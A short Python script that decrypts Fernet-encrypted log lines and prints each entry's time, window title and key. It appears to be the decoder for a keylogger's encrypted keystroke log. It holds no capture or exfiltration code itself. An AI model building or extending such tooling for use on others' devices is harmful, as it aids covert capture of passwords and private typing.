import json
from cryptography.fernet import Fernet

# Load encryption key
with open("key.key", "rb") as f:
    key = f.read()
cipher = Fernet(key)

# Decrypt logs
log_file = "logs.enc"
with open(log_file, "rb") as f:
    lines = f.readlines()

for line in lines:
    try:
        decrypted = cipher.decrypt(line.strip())
        entry = json.loads(decrypted.decode())
        print(f"[{entry['time']}] ({entry['window']}) {entry['key']}")
    except Exception as e:
        print("Error decrypting line:", e)
